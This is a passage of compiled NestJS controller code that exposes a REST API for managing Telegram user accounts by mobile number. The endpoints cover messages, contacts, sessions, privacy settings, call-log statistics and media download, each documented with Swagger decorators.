            silent: schedule.silent
        });
    }
    async getScheduledMessages(mobile, chatId) {
        return this.telegramService.getScheduledMessages(mobile, chatId);
    }
    async sendVoiceMessage(mobile, voice) {
        if (!voice.chatId || voice.chatId.trim().length === 0) {
            throw new common_1.BadRequestException('Chat ID is required and cannot be empty');
        }
        if (!voice.url || voice.url.trim().length === 0) {
            throw new common_1.BadRequestException('URL is required and cannot be empty');
        }
        try {
            new URL(voice.url);
        }
        catch {
            throw new common_1.BadRequestException('Invalid URL format. Please provide a valid HTTP/HTTPS URL.');
        }
        if (voice.duration !== undefined && (voice.duration < 0 || !Number.isInteger(voice.duration))) {
            throw new common_1.BadRequestException('Duration must be a non-negative integer (in seconds)');
        }
        return this.telegramService.sendVoiceMessage(mobile, voice);
    }
    async sendViewOnceMedia(mobile, file, viewOnceDto) {
        if (viewOnceDto.sourceType === dto_1.MediaSourceType.BINARY && file) {
            return this.telegramService.sendViewOnceMedia(mobile, {
                chatId: viewOnceDto.chatId,
                sourceType: viewOnceDto.sourceType,
                binaryData: file.buffer,
                caption: viewOnceDto.caption,
                filename: viewOnceDto.filename || file.originalname
            });
        }
        return this.telegramService.sendViewOnceMedia(mobile, {
            chatId: viewOnceDto.chatId,
            sourceType: viewOnceDto.sourceType,
            path: viewOnceDto.path,
            base64Data: viewOnceDto.base64Data,
            caption: viewOnceDto.caption,
            filename: viewOnceDto.filename
        });
    }
    async getChatHistory(mobile, chatId, offset, limit) {
        return this.telegramService.getMessagesNew(mobile, chatId, offset, limit);
    }
    async promoteToAdmin(mobile, adminOp) {
        return this.telegramService.promoteToAdmin(mobile, adminOp.groupId, adminOp.userId, adminOp.permissions, adminOp.rank);
    }
    async demoteAdmin(mobile, memberOp) {
        return this.telegramService.demoteAdmin(mobile, memberOp.groupId, memberOp.members[0]);
    }
    async unblockGroupUser(mobile, data) {
        return this.telegramService.unblockGroupUser(mobile, data.groupId, data.userId);
    }
    async getGroupAdmins(mobile, groupId) {
        return this.telegramService.getGroupAdmins(mobile, groupId);
    }
    async getGroupBannedUsers(mobile, groupId) {
        return this.telegramService.getGroupBannedUsers(mobile, groupId);
    }
    async exportContacts(mobile, exportDto, res) {
        const data = await this.telegramService.exportContacts(mobile, exportDto.format, exportDto.includeBlocked);
        const filename = `contacts_${mobile}_${new Date().toISOString()}.${exportDto.format}`;
        res.setHeader('Content-Type', exportDto.format === 'vcard' ? 'text/vcard' : 'text/csv');
        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
        res.send(data);
    }
    async importContacts(mobile, contacts) {
        return this.telegramService.importContacts(mobile, contacts);
    }
    async manageBlockList(mobile, blockList) {
        return this.telegramService.manageBlockList(mobile, blockList.userIds, blockList.block);
    }
    async getContactStatistics(mobile) {
        return this.telegramService.getContactStatistics(mobile);
    }
    async createChatFolder(mobile, folder) {
        return this.telegramService.createChatFolder(mobile, folder);
    }
    async getChatFolders(mobile) {
        return this.telegramService.getChatFolders(mobile);
    }
    async editMessage(mobile, options) {
        return this.telegramService.editMessage(mobile, options);
    }
    async updateChatSettings(mobile, settings) {
        return this.telegramService.updateChatSettings(mobile, settings);
    }
    async sendMediaBatch(mobile, options) {
        return this.telegramService.sendMediaBatch(mobile, options);
    }
    async hasPassword(mobile) {
        return this.telegramService.hasPassword(mobile);
    }
    async getChats(mobile, limit, offsetDate, offsetId, offsetPeer, folderId) {
        return this.telegramService.getChats(mobile, { limit, offsetDate, offsetId, offsetPeer, folderId });
    }
    async getFileUrl(mobile, url, filename) {
        return this.telegramService.getFileUrl(mobile, url, filename);
    }
    async getMessageStats(mobile, options) {
        return this.telegramService.getMessageStats(mobile, options);
    }
    async getTopPrivateChats(mobile, limit) {
        return this.telegramService.getTopPrivateChats(mobile, limit);
    }
    async getSelfMsgsInfo(mobile, limit) {
        if (limit !== undefined && (limit < 1 || limit > 10000)) {
            throw new common_1.BadRequestException('Limit must be between 1 and 10000.');
        }
        return this.telegramService.getSelfMsgsInfo(mobile, limit);
    }
    async addBotsToChannel(mobile, body) {
        return this.telegramService.addBotsToChannel(mobile, body.channelIds);
    }
    async createBot(mobile, createBotDto) {
        return this.telegramService.createBot(mobile, createBotDto);
    }
};
exports.TelegramController = TelegramController;
__decorate([
    (0, common_1.Get)('connect/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Connect to Telegram' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'autoDisconnect', description: 'Whether to auto disconnect the client after period of inactivity', required: false, type: Boolean, default: true }),
    (0, swagger_1.ApiQuery)({ name: 'handler', description: 'Whether to use event handler', required: false, type: Boolean, default: true }),
    (0, swagger_1.ApiResponse)({ type: Object, schema: { properties: { message: { type: 'string' } } } }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('autoDisconnect')),
    __param(2, (0, common_1.Query)('handler')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Boolean, Boolean]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "connect", null);
__decorate([
    (0, common_1.Get)('disconnect/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Disconnect from Telegram' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object, schema: { properties: { message: { type: 'string' } } } }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "disconnect", null);
__decorate([
    (0, common_1.Get)('disconnect-all'),
    (0, swagger_1.ApiOperation)({ summary: 'Disconnect all clients' }),
    (0, swagger_1.ApiResponse)({ type: Object, schema: { properties: { message: { type: 'string' } } } }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "disconnectAll", null);
__decorate([
    (0, common_1.Get)('connection/stats'),
    (0, swagger_1.ApiOperation)({ summary: 'Get connection statistics' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", void 0)
], TelegramController.prototype, "getConnectionStats", null);
__decorate([
    (0, common_1.Get)('connection/state/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get connection state for a client' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ type: connection_management_dto_1.ConnectionStatusDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", connection_management_dto_1.ConnectionStatusDto)
], TelegramController.prototype, "getClientState", null);
__decorate([
    (0, common_1.Get)('connection/count'),
    (0, swagger_1.ApiOperation)({ summary: 'Get active connection count' }),
    (0, swagger_1.ApiResponse)({ type: Number }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Number)
], TelegramController.prototype, "getActiveConnectionCount", null);
__decorate([
    (0, common_1.Get)('me/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get current user profile' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getMe", null);
__decorate([
    (0, common_1.Get)('entity/:mobile/:entity'),
    (0, swagger_1.ApiOperation)({ summary: 'Get Entity profile' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiParam)({ name: 'entity', description: 'Entity identifier', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Param)('entity')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getEntity", null);
__decorate([
    (0, common_1.Post)('profile/update/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update profile information' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: update_profile_dto_1.UpdateProfileDto }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_profile_dto_1.UpdateProfileDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updateProfile", null);
__decorate([
    (0, common_1.Post)('profile/photo/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Set profile photo' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.ProfilePhotoDto }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.ProfilePhotoDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "setProfilePhoto", null);
__decorate([
    (0, common_1.Delete)('profile/photos/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete all profile photos' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "deleteProfilePhotos", null);
__decorate([
    (0, common_1.Get)('messages/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get chat messages' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, type: Number }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('limit')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getMessages", null);
__decorate([
    (0, common_1.Post)('message/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Send a Telegram message as a user' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the user account to send the message from', required: true }),
    (0, swagger_1.ApiBody)({ type: send_message_dto_1.SendTgMessageDto }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, send_message_dto_1.SendTgMessageDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendMessage", null);
__decorate([
    (0, common_1.Post)('messages/forward/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Forward messages' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.ForwardBatchDto }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.ForwardBatchDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "forwardMessage", null);
__decorate([
    (0, common_1.Post)('batch-process/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Process operations in batches' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.BatchProcessDto }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.BatchProcessDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "processBatchMessages", null);
__decorate([
    (0, common_1.Get)('messages/search/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Search messages in Telegram', description: 'Search for messages in a specific chat or globally across all chats' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ type: message_search_dto_1.SearchMessagesDto }),
    (0, swagger_1.ApiResponse)({ type: message_search_dto_1.SearchMessagesResponseDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, message_search_dto_1.SearchMessagesDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "searchMessages", null);
__decorate([
    (0, common_1.Get)('channels/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get channel information' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'includeIds', required: false, type: Boolean }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('includeIds')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Boolean]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getChannelInfo", null);
__decorate([
    (0, common_1.Post)('forwardMediatoMe/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Forward media messages to me' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'channel', description: 'Channel username or ID', required: false }),
    (0, swagger_1.ApiQuery)({ name: 'fromChatId', description: 'Source chat ID to forward messages from', required: false }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('channel')),
    __param(2, (0, common_1.Query)('fromChatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "forwardMedia", null);
__decorate([
    (0, common_1.Post)('channels/leave/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Leave channel' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'channel', description: 'Channel ID/username', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('channel')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "leaveChannel", null);
__decorate([
    (0, common_1.Patch)('username/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update the Telegram username of a user' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the user whose username should be updated', required: true }),
    (0, swagger_1.ApiBody)({ type: update_username_dto_1.UpdateUsernameDto }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_username_dto_1.UpdateUsernameDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updateUsername", null);
__decorate([
    (0, common_1.Post)('2fa/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Setup two-factor authentication' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "setup2FA", null);
__decorate([
    (0, common_1.Post)('privacy/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update privacy settings' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updatePrivacy", null);
__decorate([
    (0, common_1.Post)('privacy/batch/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update multiple privacy settings' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.PrivacySettingsDto }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.PrivacySettingsDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updatePrivacyBatch", null);
__decorate([
    (0, common_1.Get)('sessions/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get active sessions' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getActiveSessions", null);
__decorate([
    (0, common_1.Delete)('sessions/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Terminate other sessions' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "terminateOtherSessions", null);
__decorate([
    (0, common_1.Post)('sessions/new/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Create new session' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "createNewSession", null);
__decorate([
    (0, common_1.Get)('session/info/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get session information' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getSessionInfo", null);
__decorate([
    (0, common_1.Post)('session/terminate/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Terminate specific session' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ schema: { type: 'object', properties: { hash: { type: 'string' }, type: { type: 'string', enum: ['app', 'web'] }, exceptCurrent: { type: 'boolean' } } } }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "terminateSession", null);
__decorate([
    (0, common_1.Get)('monitoring/status'),
    (0, swagger_1.ApiOperation)({ summary: 'Get service health and connection status' }),
    (0, swagger_1.ApiResponse)({ type: connection_management_dto_1.ConnectionStatusDto }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getConnectionStatus", null);
__decorate([
    (0, common_1.Get)('monitoring/calllog/:mobile'),
    (0, swagger_1.ApiOperation)({
        summary: 'Get call log statistics with enhanced filtering',
        description: 'Retrieves comprehensive call statistics including incoming/outgoing calls, video/audio breakdown, ' +
            'and per-chat call counts. Uses server-side filtering for optimal performance. ' +
            'Supports pagination via limit parameter (default: 1000, max: 10000).'
    }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({
        name: 'limit',
        required: false,
        type: Number,
        description: 'Maximum number of calls to analyze (default: 1000, max: 10000)',
        example: 1000,
        minimum: 1,
        maximum: 10000
    }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Call log statistics retrieved successfully',
        schema: {
            type: 'object',
            properties: {
                outgoing: { type: 'number', description: 'Total outgoing calls' },
                incoming: { type: 'number', description: 'Total incoming calls' },
                video: { type: 'number', description: 'Total video calls' },
                audio: { type: 'number', description: 'Total audio calls' },
                chatCallCounts: {
                    type: 'array',
                    description: 'Per-chat call statistics (only chats with >4 calls)',
                    items: {
                        type: 'object',
                        properties: {
                            chatId: { type: 'string' },
                            phone: { type: 'string' },
                            username: { type: 'string' },
                            name: { type: 'string' },
                            count: { type: 'number' },
                            msgs: { type: 'number', description: 'Total messages in chat' },
                            video: { type: 'number', description: 'Video messages count' },
                            photo: { type: 'number', description: 'Photo messages count' },
                            peerType: { type: 'string', enum: ['user', 'group', 'channel'] }
                        }
                    }
                },
                totalCalls: { type: 'number', description: 'Total number of calls analyzed' },
                analyzedCalls: { type: 'number', description: 'Number of calls actually processed' }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Bad Request - invalid limit parameter' }),
    (0, swagger_1.ApiResponse)({ status: 500, description: 'Internal Server Error' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('limit')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getCallLogStats", null);
__decorate([
    (0, common_1.Post)('contacts/add-bulk/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Add multiple contacts in bulk' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.AddContactsDto }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.AddContactsDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "addContactsBulk", null);
__decorate([
    (0, common_1.Get)('contacts/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get all contacts' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getContacts", null);
__decorate([
    (0, common_1.Post)('media/send/:mobile'),
    (0, swagger_1.ApiOperation)({
        summary: 'Send media message',
        description: 'Send a photo or file to a chat. Maximum file size is 100MB. Supports images, videos, and documents.'
    }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the Telegram account', required: true, example: '1234567890' }),
    (0, swagger_1.ApiBody)({ type: dto_1.SendMediaDto }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Media sent successfully',
        type: Object
    }),
    (0, swagger_1.ApiResponse)({
        status: 400,
        description: 'Invalid request - file too large, invalid URL, or missing required fields'
    }),
    (0, swagger_1.ApiResponse)({
        status: 500,
        description: 'Failed to send media - check Telegram connection or file accessibility'
    }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.SendMediaDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendMedia", null);
__decorate([
    (0, common_1.Get)('media/download/:mobile'),
    (0, swagger_1.ApiOperation)({
        summary: 'Preview or download media from a message',
        description: 'Download or preview media from a Telegram message. Images and videos preview in browser, other files download. Supports HTTP Range requests for video streaming.'
    }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the Telegram account', required: true, example: '1234567890' }),
    (0, swagger_1.ApiQuery)({
        name: 'chatId',
        required: true,
        description: 'Chat ID or username. Use "me" for saved messages, channel username (e.g., "channelname"), or numeric ID',
        example: 'me'
    }),
    (0, swagger_1.ApiQuery)({
        name: 'messageId',
        required: true,
        description: 'Message ID containing the media (must be a positive number)',
        type: Number,
        example: 12345
    }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Media file (preview in browser for images/videos, download for other types)',
        content: {
            'image/*': { schema: { type: 'string', format: 'binary' } },
            'video/*': { schema: { type: 'string', format: 'binary' } },
            'application/*': { schema: { type: 'string', format: 'binary' } }
        }
    }),
    (0, swagger_1.ApiResponse)({
        status: 206,
        description: 'Partial content (when using Range header for video streaming)'
    }),
    (0, swagger_1.ApiResponse)({
        status: 304,
        description: 'Not modified (when using If-None-Match header for caching)'
    }),
    (0, swagger_1.ApiResponse)({
        status: 404,
        description: 'Media not found - message ID does not exist or message has no media'
    }),
    (0, swagger_1.ApiResponse)({
        status: 416,
        description: 'Range not satisfiable - invalid Range header'
    }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('messageId')),
    __param(3, (0, common_1.Res)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Number, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "downloadMedia", null);
__decorate([
    (0, common_1.Get)('media/thumbnail/:mobile'),
    (0, swagger_1.ApiOperation)({
        summary: 'Get thumbnail for a media message',
        description: 'Get thumbnail image for a Telegram message containing media (photo or video). Returns JPEG image. Supports caching with ETag headers.'
    }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the Telegram account', required: true, example: '1234567890' }),
    (0, swagger_1.ApiQuery)({
        name: 'chatId',
        required: true,
        description: 'Chat ID or username. Use "me" for saved messages, channel username (e.g., "channelname"), or numeric ID',
        example: 'me'
    }),
    (0, swagger_1.ApiQuery)({
        name: 'messageId',
        required: true,
        description: 'Message ID containing the media (must be a positive number)',
        type: Number,
        example: 12345
    }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Thumbnail image (JPEG format)',
        content: {
            'image/jpeg': { schema: { type: 'string', format: 'binary' } }
        }
    }),
    (0, swagger_1.ApiResponse)({
        status: 304,
        description: 'Not modified (when using If-None-Match header for caching)'
    }),
    (0, swagger_1.ApiResponse)({
        status: 404,
        description: 'Thumbnail not found - message ID does not exist, message has no media, or thumbnail is not available'
    }),
    (0, swagger_1.ApiResponse)({
        status: 500,
        description: 'Error getting thumbnail'
    }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('messageId')),
    __param(3, (0, common_1.Res)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Number, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getThumbnail", null);
__decorate([
    (0, common_1.Post)('media/album/:mobile'),
    (0, swagger_1.ApiOperation)({
        summary: 'Send media album (multiple photos/videos)',
        description: 'Send multiple media files as an album. If some items fail, the operation continues and returns a summary of successful and failed items.'
    }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the Telegram account', required: true, example: '1234567890' }),
    (0, swagger_1.ApiBody)({ type: dto_1.SendMediaAlbumDto }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Album sent with summary of results',
        schema: {
            type: 'object',
            properties: {
                success: { type: 'number', description: 'Number of successfully sent items' },
                failed: { type: 'number', description: 'Number of failed items' },
                errors: {
                    type: 'array',
                    items: {
                        type: 'object',
                        properties: {
                            index: { type: 'number', description: 'Index of failed item' },
                            error: { type: 'string', description: 'Error message' }
                        }
                    },
                    description: 'Details of failed items (only present if failed > 0)'
                }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({
        status: 400,
        description: 'Invalid request - empty album, invalid URLs, or file size exceeds limit'
    }),
    (0, swagger_1.ApiResponse)({
        status: 500,
        description: 'Failed to send album - all items failed or Telegram connection error'
    }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendMediaAlbum", null);
__decorate([
    (0, common_1.Get)('media/metadata/:mobile'),
    (0, swagger_1.ApiOperation)({
        summary: 'Get media metadata from a chat',
        description: 'Retrieve metadata for media messages in a chat. Supports filtering by type, date range, and message ID range. Use maxId for pagination (get messages with ID less than maxId).'
    }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the Telegram account', required: true, example: '1234567890' }),
    (0, swagger_1.ApiQuery)({
        name: 'chatId',
        required: true,
        description: 'Chat ID or username. Use "me" for saved messages, channel username, or numeric ID',
        example: 'me'
    }),
    (0, swagger_1.ApiQuery)({
        name: 'types',
        enum: ['photo', 'video', 'document', 'voice', 'all'],
        required: false,
        isArray: true,
        description: 'Filter by media types. Use "all" to get all types grouped by type. If not specified, returns all media types.',
        example: ['photo', 'video']
    }),
    (0, swagger_1.ApiQuery)({
        name: 'startDate',
        required: false,
        description: 'Start date for filtering (ISO 8601 format: YYYY-MM-DD or YYYY-MM-DDTHH:mm:ss)',
        example: '2024-01-01'
    }),
    (0, swagger_1.ApiQuery)({
        name: 'endDate',
        required: false,
        description: 'End date for filtering (ISO 8601 format: YYYY-MM-DD or YYYY-MM-DDTHH:mm:ss)',
        example: '2024-12-31'
